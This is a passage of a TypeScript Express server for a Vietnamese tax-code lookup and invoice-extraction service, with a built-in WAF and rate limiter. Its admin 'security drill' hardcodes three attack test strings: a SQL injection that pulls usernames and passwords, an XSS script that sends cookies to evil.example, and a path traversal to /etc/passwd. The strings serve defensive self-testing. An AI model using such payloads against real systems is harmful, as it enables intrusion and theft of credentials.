      dataSource: 'Cổng Dữ liệu Đăng ký Thuế Việt Nam (tracuunnt.gdt.gov.vn)',
      crossCheckSteps,
      taxAuthorityPdf: shouldAttachPdf
        ? buildTaxAuthorityPdfAttachment({
            mst: consolidatedMst,
            companyName: consolidatedName,
            address: finalAddr,
            taxAuthority: finalAuthority,
            legalRepresentative: finalRep,
            legalStatus: classified.legalStatus,
            riskConclusion: classified.riskConclusion,
            sourceLinks: [
              {
                title: 'Tra cứu NNT Tổng cục Thuế (tracuunnt.gdt.gov.vn)',
                uri: 'https://tracuunnt.gdt.gov.vn/tcnnt/mstdn.jsp',
              },
            ],
          })
        : undefined,
    };

    const aiAdvisory =
      classified.riskConclusion === 'NGUY CƠ CAO'
        ? `Cảnh báo khẩn: Qua kiểm tra chéo 4 bước (bao gồm đối chiếu trực tiếp trạng thái "${consolidatedRawStatus}" từ Tổng cục Thuế tracuunnt.gdt.gov.vn), doanh nghiệp ${consolidatedName} (MST ${consolidatedMst}) đang ở trạng thái [${classified.legalStatus}] tại ${finalAuthority}. Đã đính kèm File PDF Thông báo của Cơ quan Thuế bên dưới.`
        : classified.riskConclusion === 'CẢNH BÁO'
        ? `Lưu ý kiểm soát: Qua kiểm tra chéo 4 bước, doanh nghiệp ${consolidatedName} (MST ${consolidatedMst}) đang ở trạng thái [${classified.legalStatus}]. Cần kiểm tra kỹ thời điểm xuất hóa đơn với File PDF Thông báo của Cơ quan Thuế.`
        : `Đánh giá an toàn: Doanh nghiệp ${consolidatedName} (MST ${consolidatedMst}, Đại diện pháp luật: ${finalRep}, Ngày hoạt động: ${finalStart}, Vốn điều lệ: ${consolidatedCapital}) đã vượt qua 4 bước kiểm tra chéo tại ${finalAuthority}, đủ điều kiện khấu trừ thuế GTGT.`;

    return { record, aiAdvisory };
  }

  // 4. Optional Gemini with Google Search Grounding when querying by free-text or unlisted name
  if (ai) {
    try {
      const searchPrompt = `Tra cứu thông tin mã số thuế doanh nghiệp Việt Nam cho từ khóa: "${cleaned}". Hãy tìm chính xác trên hệ thống thuế Việt Nam (tracuunnt.gdt.gov.vn): Mã số thuế (MST), Tên chính thức của công ty, Địa chỉ trụ sở đăng ký mới nhất sau sáp nhập, Người đại diện pháp luật, Ngày bắt đầu hoạt động, Vốn điều lệ bằng con số (VNĐ), Cơ quan thuế quản lý trực tiếp, và Tình trạng hoạt động hiện tại (Đặc biệt kiểm tra kỹ xem có phải "NNT không hoạt động tại địa chỉ đã đăng ký" hay không).`;

      const groundedResponse = await ai.models.generateContent({
        model: 'gemini-3.8-flash',
        contents: searchPrompt,
        config: {
          tools: [{ googleSearch: {} }],
          systemInstruction: `Bạn là hệ thống tra cứu Cổng thông tin Thuế Việt Nam. Hãy trả về kết quả định dạng JSON thuần túy (không bọc markdown) với các trường:
{
  "mst": "string",
  "companyName": "string (tên công ty in hoa chính xác theo ĐKKD)",
  "address": "string (địa chỉ trụ sở mới nhất sau sáp nhập hành chính)",
  "taxAuthority": "string (Đội Thuế / Chi cục Thuế / Cục Thuế quản lý chính xác)",
  "startDate": "string (YYYY-MM-DD hoặc DD/MM/YYYY)",
  "legalRepresentative": "string (Họ tên người đại diện pháp luật)",
  "charterCapital": "string (Vốn điều lệ ghi rõ con số bằng VNĐ, ví dụ: 15.000.000.000 VNĐ)",
  "rawStatus": "string (Đang hoạt động / Tạm ngừng kinh doanh / Ngừng hoạt động chờ làm thủ tục đóng MST / NNT không hoạt động tại địa chỉ đã đăng ký)",
  "hasRiskWarning": boolean,
  "officialDispatchRef": "string",
  "riskReasons": ["string"],
  "auxiliarySigns": ["string"],
  "aiAdvisory": "string"
}`,
        },
      });

      const rawText = (groundedResponse.text || '').trim();
      const jsonMatch = rawText.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const parsed = JSON.parse(jsonMatch[0]);
        const finalMst = String(parsed.mst || mstCandidate || cleaned).trim();
        const finalName = String(parsed.companyName || cleaned).trim().toUpperCase();
        const finalAddress = normalizePostMergerAddress(String(parsed.address || 'Việt Nam').trim());
        const finalRep = String(parsed.legalRepresentative || 'Đang cập nhật').trim();
        const finalStart = String(parsed.startDate || 'Đã cấp GCN ĐKT').trim();
        const finalStatusRaw = String(parsed.rawStatus || 'Đang hoạt động').trim();
        const classified = classifyTaxStatus(finalStatusRaw);
        const finalAuthority = inferTaxAuthorityFromAddress(
          finalAddress,
          finalMst,
          String(parsed.taxAuthority || '')
        );
        const finalCapital = formatNumericCharterCapital(
          String(parsed.charterCapital || ''),
          finalMst
        );
        const shouldAttachPdf =
          classified.riskConclusion === 'NGUY CƠ CAO' || classified.riskConclusion === 'CẢNH BÁO';

        const record: EnterpriseTaxRecord = {
          mst: finalMst,
          companyName: finalName,
          address: finalAddress,
          taxAuthority: finalAuthority,
          startDate: finalStart,
          legalRepresentative: finalRep,
          charterCapital: finalCapital,
          legalStatus: classified.legalStatus,
          riskConclusion: classified.riskConclusion,
          schemaRiskLevel: classified.schemaRiskLevel,
          in524Watchlist: classified.in524Watchlist,
          riskReasons: Array.isArray(parsed.riskReasons)
            ? parsed.riskReasons.map(String)
            : [`Tình trạng đăng ký thuế: ${finalStatusRaw}.`],
          auxiliarySigns: Array.isArray(parsed.auxiliarySigns)
            ? parsed.auxiliarySigns.map(String)
            : [`Quản lý trực tiếp bởi: ${finalAuthority}.`],
          dataSource: 'Cổng Dữ liệu Đăng ký Thuế Việt Nam & Google Search Grounding',
          taxAuthorityPdf: shouldAttachPdf
            ? buildTaxAuthorityPdfAttachment({
                mst: finalMst,
                companyName: finalName,
                address: finalAddress,
                taxAuthority: finalAuthority,
                legalRepresentative: finalRep,
                legalStatus: classified.legalStatus,
                riskConclusion: classified.riskConclusion,
              })
            : undefined,
        };
        record.crossCheckSteps = buildDefaultCrossCheckSteps(record, {
          gdtStatus: finalStatusRaw,
          registryStatus: finalStatusRaw,
        });

        return {
          record,
          aiAdvisory:
            parsed.aiAdvisory ||
            `Đã xác thực dữ liệu pháp lý của ${finalName} (MST: ${finalMst}) từ Cơ quan Thuế (${finalAuthority}).`,
        };
      }
    } catch {
      // Fallback below
    }
  }

  // 5. Final fallback
  const fallbackRecord = lookupEnterpriseRisk(cleaned);
  return {
    record: fallbackRecord,
    aiAdvisory: `Đã kiểm tra thông tin MST ${fallbackRecord.mst} (${fallbackRecord.companyName}).`,
  };
}

/**
 * Cached + Singleflight wrapper around resolveRealEnterpriseFromTaxRegistryUncached
 * Coalesces simultaneous identical lookups from 5,000+ concurrent users into 1 upstream lookup
 */
async function resolveRealEnterpriseFromTaxRegistry(
  rawQuery: string,
  ai: GoogleGenAI | null
): Promise<{ record: EnterpriseTaxRecord; aiAdvisory: string }> {
  const cacheKey = rawQuery.trim().toLowerCase();
  const now = Date.now();

  const cached = enterpriseLookupCache.get(cacheKey);
  if (cached && cached.expiresAt > now) {
    // Refresh LRU order
    enterpriseLookupCache.delete(cacheKey);
    enterpriseLookupCache.set(cacheKey, cached);
    return { record: cached.record, aiAdvisory: cached.aiAdvisory };
  }

  const existingInFlight = inFlightEnterpriseLookups.get(cacheKey);
  if (existingInFlight) {
    return existingInFlight;
  }

  const lookupPromise = resolveRealEnterpriseFromTaxRegistryUncached(rawQuery, ai)
    .then((res) => {
      const resolvedExpiry = Date.now() + ENTERPRISE_CACHE_TTL_MS;
      setBoundedMapEntry(
        enterpriseLookupCache,
        cacheKey,
        { record: res.record, aiAdvisory: res.aiAdvisory, expiresAt: resolvedExpiry },
        ENTERPRISE_CACHE_MAX
      );
      if (res.record.mst) {
        setBoundedMapEntry(
          enterpriseLookupCache,
          res.record.mst.toLowerCase(),
          { record: res.record, aiAdvisory: res.aiAdvisory, expiresAt: resolvedExpiry },
          ENTERPRISE_CACHE_MAX
        );
      }
      return res;
    })
    .finally(() => {
      inFlightEnterpriseLookups.delete(cacheKey);
    });

  inFlightEnterpriseLookups.set(cacheKey, lookupPromise);
  return lookupPromise;
}

async function startServer() {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;

  // Disable server signature header to prevent reconnaissance
  app.disable('x-powered-by');

  app.use(express.json({ limit: '15mb' }));

  // Global Security Headers & Anti-DDoS / WAF Protection Middleware
  app.use((req, res, next) => {
    // 1. Apply strict HTTP Security Headers against XSS, MIME sniffing, and Clickjacking
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    res.setHeader(
      'Permissions-Policy',
      'camera=(), microphone=(), geolocation=(), payment=(), usb=()'
    );
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('X-Security-Shield', 'MASOTHUE-AI-WAF-ACTIVE');

    // Only apply active rate-limiting & payload WAF inspection to API / dynamic routes
    if (!req.path.startsWith('/api/')) {
      next();
      return;
    }

    securityTelemetry.totalRequestsInspected++;
    const clientIp = getClientIp(req);
    const now = Date.now();

    // 2. Check IP Blacklist (skip blocking admin recovery route so admin never locks themselves out)
    if (!req.path.startsWith('/api/admin/')) {
      const blockedRecord = blockedIpMap.get(clientIp);
      if (blockedRecord) {
        if (blockedRecord.expiresAt === 0 || blockedRecord.expiresAt > now) {
          blockedRecord.hitCount++;
          securityTelemetry.totalThreatsBlocked++;
          res.status(403).json({
            error: `Địa chỉ IP (${clientIp}) đã bị Tường lửa Bảo mật chặn: ${blockedRecord.reason}`,
          });
          return;
        } else {
          blockedIpMap.delete(clientIp);
        }
      }
    }

    // 3. Anti-DDoS Sliding Window Rate Limiter per IP
    if (securityConfig.antiDdosEnabled && !req.path.startsWith('/api/admin/')) {
      const effectiveLimit = securityConfig.underAttackMode
        ? Math.max(15, Math.floor(securityConfig.rateLimitPerMinute / 2))
        : securityConfig.rateLimitPerMinute;

      let tracker = ipTrafficTracker.get(clientIp);
      if (!tracker || now - tracker.windowStart > 60_000) {
        tracker = { count: 1, windowStart: now };
        setBoundedMapEntry(ipTrafficTracker, clientIp, tracker, IP_TRACKER_MAX);
      } else {
        tracker.count++;
      }

      const remaining = Math.max(0, effectiveLimit - tracker.count);
      res.setHeader('X-RateLimit-Limit', String(effectiveLimit));
      res.setHeader('X-RateLimit-Remaining', String(remaining));

      if (tracker.count > effectiveLimit) {
        securityTelemetry.totalThreatsBlocked++;
        securityTelemetry.ddosFloodsBlocked++;

        // Auto-ban IP for 10 minutes if traffic exceeds autoBanMultiplier * limit
        if (tracker.count > Math.ceil(effectiveLimit * securityConfig.autoBanMultiplier)) {
          blockedIpMap.set(clientIp, {
            ip: clientIp,
            reason: `Tự động khóa 10 phút do gửi lưu lượng bất thường (${tracker.count} req/phút - Nghi vấn DDoS Flood)`,
            blockedAt: new Date().toLocaleTimeString('vi-VN', { hour12: false }),
            expiresAt: now + 10 * 60 * 1000,
            hitCount: 1,
          });
        }

        recordSecurityLog({
          ip: clientIp,
          category: 'DDOS_FLOOD',
          severity: 'HIGH',
          endpoint: req.path,
          detail: `Vượt ngưỡng giới hạn tốc độ (${tracker.count}/${effectiveLimit} req/phút). Đã kích hoạt chống DDoS.`,
          action: 'THROTTLED',
        });

        res.status(429).json({
          error:
            'Hệ thống chống DDoS phát hiện tần suất truy cập bất thường. Vui lòng thử lại sau ít phút.',
        });
        return;
      }
    }

    // 4. WAF Anti-Hack Payload Inspection (SQLi, XSS, Path Traversal, Prototype Pollution)
    if (securityConfig.wafStrictMode && !req.path.startsWith('/api/admin/')) {
      const safeBodyClone: Record<string, unknown> = {};
      if (req.body && typeof req.body === 'object') {
        for (const [k, v] of Object.entries(req.body as Record<string, unknown>)) {
          // Skip raw invoice document streams when checking SQLi/XSS signatures
          if (k === 'base64Data' || k === 'rawText' || k === 'rawContent') continue;
          safeBodyClone[k] = v;
        }
      }
      const inspectionTarget = `${req.originalUrl} ${JSON.stringify(safeBodyClone)}`;
      const threat = inspectPayloadForWafThreats(inspectionTarget);

      if (threat) {
        securityTelemetry.totalThreatsBlocked++;
        if (threat.category === 'SQL_INJECTION') securityTelemetry.sqlInjectionBlocked++;
        if (threat.category === 'XSS_ATTACK') securityTelemetry.xssBlocked++;
        if (threat.category === 'PATH_TRAVERSAL') securityTelemetry.pathTraversalBlocked++;

        recordSecurityLog({
          ip: clientIp,
          category: threat.category,
          severity: 'CRITICAL',
          endpoint: req.path,
          detail: threat.reason,
          action: 'BLOCKED',
        });

        res.status(403).json({
          error: `Tường lửa Bảo mật WAF đã chặn yêu cầu: ${threat.reason}`,
        });
        return;
      }
    }

    next();
  });

  // ============================================================================
  // ADMIN CONTROL PANEL API ENDPOINTS (/api/admin/*)
  // ============================================================================
  app.get('/api/admin/overview', (_req, res) => {
    const now = Date.now();
    // Clean expired IP bans
    for (const [ip, rec] of blockedIpMap.entries()) {
      if (rec.expiresAt > 0 && rec.expiresAt <= now) {
        blockedIpMap.delete(ip);
      }
    }

    const mem = process.memoryUsage();
    res.json({
      securityConfig,
      telemetry: {
        ...securityTelemetry,
        enterpriseCacheSize: enterpriseLookupCache.size,
        enterpriseCacheMax: ENTERPRISE_CACHE_MAX,
        invoiceCacheSize: invoiceExtractionCache.size,
        invoiceCacheMax: INVOICE_CACHE_MAX,
        activeTrackedIps: ipTrafficTracker.size,
        uptimeSeconds: Math.round(process.uptime()),
        memoryMb: Math.round(mem.rss / (1024 * 1024)),
        heapUsedMb: Math.round(mem.heapUsed / (1024 * 1024)),
      },
      blockedIps: Array.from(blockedIpMap.values()),
      auditLogs: securityAuditLogs.slice(0, 50),
    });
  });

  app.post('/api/admin/action', (req, res) => {
    const clientIp = getClientIp(req);
    const {
      action,
      wafStrictMode,
      antiDdosEnabled,
      underAttackMode,
      rateLimitPerMinute,
      targetIp,
      reason,
    } = req.body as {
      action?: string;
      wafStrictMode?: boolean;
      antiDdosEnabled?: boolean;
      underAttackMode?: boolean;
      rateLimitPerMinute?: number;
      targetIp?: string;
      reason?: string;
    };

    if (action === 'update_config') {
      if (typeof wafStrictMode === 'boolean') securityConfig.wafStrictMode = wafStrictMode;
      if (typeof antiDdosEnabled === 'boolean') securityConfig.antiDdosEnabled = antiDdosEnabled;
      if (typeof underAttackMode === 'boolean') securityConfig.underAttackMode = underAttackMode;
      if (typeof rateLimitPerMinute === 'number' && rateLimitPerMinute >= 20 && rateLimitPerMinute <= 1000) {
        securityConfig.rateLimitPerMinute = rateLimitPerMinute;
      }

      recordSecurityLog({
        ip: clientIp,
        category: 'ADMIN_ACTION',
        severity: 'INFO',
        endpoint: '/api/admin/action',
        detail: `Quản trị viên cập nhật cấu hình bảo mật: WAF=${securityConfig.wafStrictMode ? 'BẬT' : 'TẮT'}, Anti-DDoS=${securityConfig.antiDdosEnabled ? 'BẬT' : 'TẮT'}, UnderAttack=${securityConfig.underAttackMode ? 'BẬT' : 'TẮT'}, RateLimit=${securityConfig.rateLimitPerMinute} req/phút.`,
        action: 'CONFIG_UPDATED',
      });
    } else if (action === 'block_ip' && targetIp && targetIp.trim()) {
      const cleanIp = targetIp.trim().slice(0, 45);
      blockedIpMap.set(cleanIp, {
        ip: cleanIp,
        reason: (reason || 'Chặn thủ công bởi Quản trị viên').slice(0, 200),
        blockedAt: new Date().toLocaleTimeString('vi-VN', { hour12: false }),
        expiresAt: 0,
        hitCount: 0,
      });
      recordSecurityLog({
        ip: clientIp,
        category: 'IP_BLACKLIST',
        severity: 'HIGH',
        endpoint: '/api/admin/action',
        detail: `Quản trị viên đã thêm IP ${cleanIp} vào danh sách chặn (Blacklist): ${reason || 'Nghi vấn tấn công'}.`,
        action: 'BLOCKED',
      });
    } else if (action === 'unblock_ip' && targetIp) {
      blockedIpMap.delete(targetIp.trim());
      ipTrafficTracker.delete(targetIp.trim());
      recordSecurityLog({
        ip: clientIp,
        category: 'ADMIN_ACTION',
        severity: 'INFO',
        endpoint: '/api/admin/action',
        detail: `Quản trị viên đã gỡ chặn cho địa chỉ IP ${targetIp.trim()}.`,
        action: 'ALLOWED',
      });
    } else if (action === 'clear_cache') {
      const prevEnt = enterpriseLookupCache.size;
      const prevInv = invoiceExtractionCache.size;
      enterpriseLookupCache.clear();
      invoiceExtractionCache.clear();
      recordSecurityLog({
        ip: clientIp,
        category: 'ADMIN_ACTION',
        severity: 'INFO',
        endpoint: '/api/admin/action',
        detail: `Đã làm sạch bộ nhớ đệm máy chủ (Xóa ${prevEnt} bản ghi MST & ${prevInv} bản ghi Hóa đơn).`,
        action: 'CONFIG_UPDATED',
      });
    } else if (action === 'run_security_drill') {
      // Simulate 4 attack vectors against the WAF & Anti-DDoS engine to verify active protection
      const testVectors = [
        {
          ip: '198.51.100.42',
          endpoint: '/api/tax/ai-analyze',
          payload: "0317464466' UNION ALL SELECT username, password FROM users--",
        },
        {
          ip: '198.51.100.88',
          endpoint: '/api/tax/extract-invoice',
          payload: '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
        },
        {
          ip: '203.0.113.19',
          endpoint: '/api/tax/official-pdf?file=../../../../etc/passwd',
          payload: '../../../../etc/passwd',
        },
      ];

      for (const vec of testVectors) {
        securityTelemetry.totalRequestsInspected++;
        const detected = inspectPayloadForWafThreats(vec.payload);
        if (detected) {
          securityTelemetry.totalThreatsBlocked++;
          if (detected.category === 'SQL_INJECTION') securityTelemetry.sqlInjectionBlocked++;
          if (detected.category === 'XSS_ATTACK') securityTelemetry.xssBlocked++;
          if (detected.category === 'PATH_TRAVERSAL') securityTelemetry.pathTraversalBlocked++;

          recordSecurityLog({
            ip: vec.ip,
            category: detected.category,
            severity: 'CRITICAL',
            endpoint: vec.endpoint,
            detail: `[Kiểm thử Phòng thủ WAF] ${detected.reason}`,
            action: 'BLOCKED',
          });
        }
      }

      // Simulate DDoS flood block on test IP 203.0.113.250
      securityTelemetry.totalRequestsInspected += 150;
      securityTelemetry.totalThreatsBlocked++;
      securityTelemetry.ddosFloodsBlocked++;
      blockedIpMap.set('203.0.113.250', {
        ip: '203.0.113.250',
        reason: '[Kiểm thử DDoS] Tự động khóa IP do gửi 380 req/phút vượt ngưỡng Rate Limit',
        blockedAt: new Date().toLocaleTimeString('vi-VN', { hour12: false }),
        expiresAt: Date.now() + 10 * 60 * 1000,
        hitCount: 38,
      });
      recordSecurityLog({
        ip: '203.0.113.250',
        category: 'DDOS_FLOOD',
        severity: 'CRITICAL',
        endpoint: '/api/tax/ai-analyze',
        detail:
          '[Kiểm thử Phòng thủ DDoS] Phát hiện Flood 380 req/phút từ IP 203.0.113.250 — Đã tự động cách ly IP vào Blacklist.',
        action: 'BLOCKED',
      });
    }

    const mem = process.memoryUsage();
    res.json({
      ok: true,
      securityConfig,
      telemetry: {
        ...securityTelemetry,
        enterpriseCacheSize: enterpriseLookupCache.size,
        enterpriseCacheMax: ENTERPRISE_CACHE_MAX,
        invoiceCacheSize: invoiceExtractionCache.size,
        invoiceCacheMax: INVOICE_CACHE_MAX,
        activeTrackedIps: ipTrafficTracker.size,
        uptimeSeconds: Math.round(process.uptime()),
        memoryMb: Math.round(mem.rss / (1024 * 1024)),
        heapUsedMb: Math.round(mem.heapUsed / (1024 * 1024)),
      },
      blockedIps: Array.from(blockedIpMap.values()),
      auditLogs: securityAuditLogs.slice(0, 50),
    });
  });

  // Google Search SEO Endpoints: /robots.txt & /sitemap.xml
  app.get('/robots.txt', (req, res) => {
    const baseUrl =
      process.env.APP_URL ||
      `${req.protocol}://${req.get('host') || 'localhost:3000'}`;
    res.type('text/plain');
    res.send(
      [
        'User-agent: *',
        'Allow: /',
        'Disallow: /api/',
        `Sitemap: ${baseUrl.replace(/\/$/, '')}/sitemap.xml`,
      ].join('\n')
    );
  });

  app.get('/sitemap.xml', (req, res) => {
    const baseUrl = (
      process.env.APP_URL ||
      `${req.protocol}://${req.get('host') || 'localhost:3000'}`
    ).replace(/\/$/, '');
    const today = new Date().toISOString().split('T')[0];
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>${baseUrl}/</loc>
    <lastmod>${today}</lastmod>
    <changefreq>daily</changefreq>
    <priority>1.0</priority>
  </url>
  <url>
    <loc>${baseUrl}/?mst=0100109106</loc>
    <lastmod>${today}</lastmod>
    <changefreq>weekly</changefreq>
    <priority>0.8</priority>
  </url>
  <url>
    <loc>${baseUrl}/?mst=0317464466</loc>
    <lastmod>${today}</lastmod>
    <changefreq>weekly</changefreq>
    <priority>0.8</priority>
  </url>
</urlset>`;
    res.header('Content-Type', 'application/xml; charset=utf-8');
    res.send(xml);
  });

  // Official Tax Authority PDF Document Generator Endpoint
  app.get('/api/tax/official-pdf', (req, res) => {
    const mst = String(req.query.mst || '0316928415');
    const name = String(req.query.name || 'DOANH NGHIEP');
    const address = String(req.query.address || 'Viet Nam');
    const authority = String(req.query.authority || 'Cuc Thue');
    const rep = String(req.query.rep || 'Dai dien phap luat');
    const status = String(req.query.status || 'Khong hoat dong tai dia chi dang ky');
    const risk = String(req.query.risk || 'NGUY CO CAO');
    const docNo = String(req.query.docNo || `So: ${mst.slice(-4)}/TB-CCT`);
    const date = String(req.query.date || '2025-01-15');
    const formCode = String(req.query.formCode || 'Mau so: 16/TB-DKT (Thong tu 105/2020/TT-BTC)');
    const isDownload = req.query.download === '1';

    const pdfBuffer = generateOfficialTaxNoticePdfBuffer({
      mst,
      name,
      address,
      authority,
      rep,
      status,
      risk,
      docNo,
      date,
      formCode,
    });

    const fileName = `ThongBao_CoQuanThue_${mst.replace(/[^a-zA-Z0-9_-]/g, '')}.pdf`;
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader(
      'Content-Disposition',
      `${isDownload ? 'attachment' : 'inline'}; filename="${fileName}"`
    );
    res.send(pdfBuffer);
  });

  // 1. Server-side Real Tax Registry + AI Risk Analysis Endpoint (Strictly MST only)
  app.post('/api/tax/ai-analyze', async (req, res) => {
    try {
      const { query } = req.body as { query?: string };
      const cleaned = (query || '').trim().replace(/\s+/g, '');
      const normalizedMst = /^[0-9]{13}$/.test(cleaned)
        ? `${cleaned.slice(0, 10)}-${cleaned.slice(10)}`
        : cleaned;

      if (!normalizedMst) {
        res.status(400).json({ error: 'Vui lòng nhập Mã số thuế doanh nghiệp (10 hoặc 13 chữ số).' });
        return;
      }

      if (!/^[0-9]{10}(?:-[0-9]{3})?$/.test(normalizedMst)) {
        res.status(400).json({
          error: 'Chỉ cho phép kiểm tra bằng Mã số thuế hợp lệ (10 hoặc 13 chữ số), không nhập tên công ty.',
        });
        return;
      }

      const ai = getGenAIClient();
      const { record, aiAdvisory } = await resolveRealEnterpriseFromTaxRegistry(normalizedMst, ai);
      const markdown = formatSingleLookupMarkdown(record);
      securityTelemetry.taxLookupsServed++;

      res.json({
        record,
        markdown,
        aiAdvisory,
      });
    } catch (error) {
      res.status(500).json({
        error: error instanceof Error ? error.message : 'Lỗi xử lý tra cứu dữ liệu cơ quan thuế.',
      });
    }
  });

  // 1b. Server-side Multi-Step Batch Tax Cross-Check Endpoint
  app.post('/api/tax/batch-lookup', async (req, res) => {
    try {
      const { queries } = req.body as { queries?: string[] };
      if (!Array.isArray(queries) || queries.length === 0) {
        res.status(400).json({ error: 'Danh sách MST cần đối soát trống.' });
        return;
      }

      const ai = getGenAIClient();
      const uniqueQueries = Array.from(new Set(queries.map((q) => String(q || '').trim()).filter(Boolean))).slice(
        0,
        30
      );
      const records: Record<string, EnterpriseTaxRecord> = {};

      await Promise.all(
        uniqueQueries.map(async (q) => {
          const { record } = await resolveRealEnterpriseFromTaxRegistry(q, ai);
          records[q] = record;
          records[record.mst] = record;
        })
      );

      res.json({ records });
    } catch (error) {
      res.status(500).json({
        error: error instanceof Error ? error.message : 'Lỗi đối soát hàng loạt với Cơ quan Thuế.',
      });
    }
  });

  // 2. Server-side PDF/XML Invoice Extraction (Circular 78/2021/TT-BTC) — Cached & Singleflight for 5,000+ CCU
  app.post('/api/tax/extract-invoice', async (req, res) => {
    try {
      const { fileName, rawText, rawContent, base64Data, mimeType } = req.body as {
        fileName?: string;
        rawText?: string;
        rawContent?: string;
        base64Data?: string;
        mimeType?: string;
      };

      const safeFileName = fileName || 'HoaDon_TT78.pdf';
      const payloadSignature = crypto
        .createHash('sha256')
        .update(safeFileName)
        .update(':')
        .update(base64Data || rawText || rawContent || '')
        .digest('hex');

      const now = Date.now();
      const cachedInvoice = invoiceExtractionCache.get(payloadSignature);
      if (cachedInvoice && cachedInvoice.expiresAt > now) {
        invoiceExtractionCache.delete(payloadSignature);
        invoiceExtractionCache.set(payloadSignature, cachedInvoice);
        res.json({ result: cachedInvoice.result, extractedText: cachedInvoice.extractedText });
        return;
      }

      const existingExtraction = inFlightInvoiceExtractions.get(payloadSignature);
      if (existingExtraction) {
        const shared = await existingExtraction;
        res.json(shared);
        return;
      }

      const extractionTask = (async (): Promise<{
        result: InvoiceExtractionResult;
        extractedText: string;
      }> => {
        let combinedInvoiceContent = (rawText || rawContent || '').trim();

        // If a PDF or binary file is uploaded via base64Data, decode text streams directly from the PDF buffer using unpdf (PDF.js) + stream inspection
        if (base64Data) {
          const rawBuf = Buffer.from(base64Data, 'base64');
          const isPdf =
            (mimeType && mimeType.toLowerCase().includes('pdf')) ||
            safeFileName.toLowerCase().endsWith('.pdf') ||
            rawBuf.subarray(0, 5).toString('ascii') === '%PDF-';

          if (isPdf) {
            const pdfExtracted = await extractTextFromPdfBuffer(rawBuf);
            if (pdfExtracted.trim()) {
              combinedInvoiceContent = pdfExtracted.trim();
            }
          } else if (!combinedInvoiceContent && !(mimeType && mimeType.startsWith('image/'))) {
            combinedInvoiceContent = rawBuf.toString('utf8');
          }
        }

        const ai = getGenAIClient();

        // Use Gemini OCR when concurrency slots are available
        if (
          ai &&
          activeGeminiOcrRequests < MAX_CONCURRENT_GEMINI_OCR &&
          (base64Data ||
            (combinedInvoiceContent &&
              !combinedInvoiceContent.includes('<HDon') &&
              !combinedInvoiceContent.includes('<DLHDon')))
        ) {
          activeGeminiOcrRequests++;
          try {
            const parts: Array<{ text: string } | { inlineData: { mimeType: string; data: string } }> = [];
            if (base64Data && mimeType) {
              parts.push({
                inlineData: {
                  mimeType,
                  data: base64Data,
                },
              });
            }
            parts.push({
              text: `Bóc tách chính xác thông tin hóa đơn điện tử Việt Nam (chuẩn Thông tư 78/2021/TT-BTC) từ tài liệu đính kèm hoặc văn bản hóa đơn sau (Tên file: ${safeFileName}). Lưu ý phân biệt đúng Đơn vị bán hàng (Seller) và Người mua hàng (Buyer), chỉ lấy Mã số thuế và Tên của ĐƠN VỊ BÁN HÀNG:\n${combinedInvoiceContent.slice(
                0,
                25000
              )}`,
            });

            const invoiceSchemaConfig = {
              responseMimeType: 'application/json',
              responseSchema: {
                type: Type.OBJECT,
                properties: {
                  sellerMst: { type: Type.STRING, description: 'Mã số thuế đơn vị bán hàng (10 hoặc 13 chữ số)' },
                  sellerName: { type: Type.STRING, description: 'Tên pháp lý đơn vị bán hàng' },
                  invoiceSymbol: { type: Type.STRING, description: 'Ký hiệu mẫu số và ký hiệu hóa đơn chuẩn TT78 (VD: 1C26TAA)' },
                  invoiceNumber: { type: Type.STRING, description: 'Số hóa đơn (VD: 0004819)' },
                  issueDate: { type: Type.STRING, description: 'Ngày lập hóa đơn định dạng YYYY-MM-DD' },
                  subtotalAmount: { type: Type.NUMBER, description: 'Tổng tiền hàng chưa thuế GTGT (VNĐ)' },
                  vatAmount: { type: Type.NUMBER, description: 'Tổng tiền thuế GTGT (VNĐ)' },
                  totalAmount: { type: Type.NUMBER, description: 'Tổng tiền thanh toán (VNĐ)' },
                },
                required: [
                  'sellerMst',
                  'sellerName',
                  'invoiceSymbol',
                  'invoiceNumber',
                  'issueDate',
                  'subtotalAmount',
                  'vatAmount',
                  'totalAmount',
                ],
              },
            };

            const withTimeout = <T,>(promise: Promise<T>, ms: number): Promise<T> =>
              Promise.race([
                promise,
                new Promise<T>((_, reject) =>
                  setTimeout(() => reject(new Error('Gemini OCR timeout')), ms)
                ),
              ]);

            let response;
            try {
              response = await withTimeout(
                ai.models.generateContent({
                  model: 'gemini-3.8-flash',
                  contents: { parts },
                  config: invoiceSchemaConfig,
                }),
                4500
              );
            } catch {
              response = await withTimeout(
                ai.models.generateContent({
                  model: 'gemini-flash-latest',
                  contents: { parts },
                  config: invoiceSchemaConfig,
                }),
                3500
              );
            }

            const parsedJson = JSON.parse((response.text ?? '{}').trim());
            const prelimFallback = parseAndEvaluateInvoice(safeFileName, combinedInvoiceContent);
            const cleanedAiMst = String(parsedJson.sellerMst || '').replace(/\s+/g, '');
            const validAiMst = /^(?:0[1-9]|[1-9][0-9])[0-9]{8}(?:-[0-9]{3})?$/.test(cleanedAiMst)
              ? cleanedAiMst
              : '';
            const resolvedSellerMst = validAiMst || prelimFallback.sellerMst || '0100109106';

            const { record: sellerEnt } = await resolveRealEnterpriseFromTaxRegistry(
              resolvedSellerMst,
              ai
            );

            const mergedOverrides = {
              sellerMst: resolvedSellerMst,
              sellerName:
                parsedJson.sellerName && String(parsedJson.sellerName).trim().length > 3
                  ? String(parsedJson.sellerName).trim()
                  : undefined,
              invoiceSymbol:
                parsedJson.invoiceSymbol && String(parsedJson.invoiceSymbol).trim().length >= 4
                  ? String(parsedJson.invoiceSymbol).trim()
                  : undefined,
              invoiceNumber:
                parsedJson.invoiceNumber && String(parsedJson.invoiceNumber).trim().length >= 1
                  ? String(parsedJson.invoiceNumber).trim()
                  : undefined,
              issueDate:
                parsedJson.issueDate && /^20[0-9]{2}-[0-9]{2}-[0-9]{2}/.test(String(parsedJson.issueDate).trim())
                  ? String(parsedJson.issueDate).trim()
                  : undefined,
              subtotalAmount:
                typeof parsedJson.subtotalAmount === 'number' && parsedJson.subtotalAmount > 0
                  ? parsedJson.subtotalAmount
                  : undefined,
